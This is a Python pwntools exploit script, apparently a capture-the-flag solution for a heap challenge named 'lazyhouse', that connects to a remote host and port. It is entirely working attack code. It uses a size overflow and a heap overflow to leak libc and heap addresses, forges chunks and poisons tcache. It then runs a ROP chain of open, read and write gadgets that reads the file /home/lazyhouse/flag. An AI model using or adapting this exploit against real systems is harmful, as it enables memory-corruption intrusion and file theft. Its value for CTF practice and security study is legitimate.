from pwn import *

#r = process(["./lazyhouse"])
r = remote("3.115.121.123", 5731)
def buy(idx,size,house):
    r.sendlineafter(":","1")
    r.recvuntil(":")
    r.sendlineafter(":",str(idx))
    r.sendlineafter(":",str(size))
    r.recvuntil(":")
    if size < 0xffffffff:
        r.sendafter(":",house)

def show(idx):
    r.sendlineafter(":","2")
    r.sendlineafter(":",str(idx))

def remove(idx):
    r.sendlineafter(":","3")
    r.sendlineafter(":",str(idx))


def Upgrade(idx,house):
    r.sendlineafter(":","4")
    r.sendlineafter(":",str(idx))
    r.sendafter(":",house)

def Super(house):
    r.sendlineafter(":","5")
    r.sendafter(":",house)



buy(0,84618092081236480,"a")
remove(0)
buy(0,0x80,"a")
buy(1,0x500,"a")
buy(2,0x80,"a")
remove(1)
buy(1,0x600,"a")
Upgrade(0,"\x00"*0x88+p64(0x513))
buy(7,0x500,"a")
show(7)
data = r.recvn(0x500)
libc =  u64(data[0x8:0x10])-0x1e50d0
heap = u64(data[0x10:0x18])-0x2e0
print hex(libc)
print hex(heap)

remove(0)
remove(1)
remove(2)
size = 0x1a0+0x90
target = heap+0x8b0
buy(6,0x80,"\x00"*8+p64(size+1)+p64(target-0x18)+p64(target-0x10)+p64(target-0x20))
buy(5,0x80,"a")
buy(0,0x80,"a")
buy(1,0x80,"a")
buy(2,0x600,"\x00"*0x508+p64(0x101))
Upgrade(1,"\x00"*0x80+p64(size)+p64(0x610))
remove(2)
context.arch = "amd64"
size = 0x6c0
buy(2,0x500,"\x00"*0x78+flat(size+1,[0]*17)+
        flat(0x31,[0]*5,0x61,[0]*11,0x21,[0]*3,0x71,[0]*13))
remove(0)
remove(1)
remove(2)


buy(0,0x1a0,p64(0)*15+p64(0x6c1))
buy(1,0x210,"a")

buy(2,0x210,"a")
remove(2)
buy(2,0x210,"\x00"*0x148+p64(0xd1))
remove(2)
for i in range(5):
    buy(2,0x210,"a")
    remove(2)



buy(2,0x3a0,"a")
remove(2)


remove(1)
buy(1,0x220,"a")
remove(5)
buy(5,0x6b0,"\x00"*0xa0+p64(heap+0x40)+"\x00"*0x80+p64(0x221)+p64(libc+0x1e4eb0)+p64(heap+0x40))
remove(1)
buy(1,0x210,"a"*0x18+flat(
"/home/lazyhouse/flag".ljust(0x20,"\x00"),
libc+0x26542,heap+0xa88-0x20,libc+0x26f9e,0,libc+0x47cf8,2,libc+0x00cf6c5,
libc+0x26542,0x3,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,0,libc+0x00cf6c5,
libc+0x26542,0x1,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,1,libc+0x00cf6c5,
libc+0x36784
))
buy(2,0x210,p64(0)*0x20+p64(libc+0x1e4c30))
Super(p64(libc+0x0058373)+"z"*0x200)
remove(1)

buy(1,heap+0xa80,"a")

r.interactive()
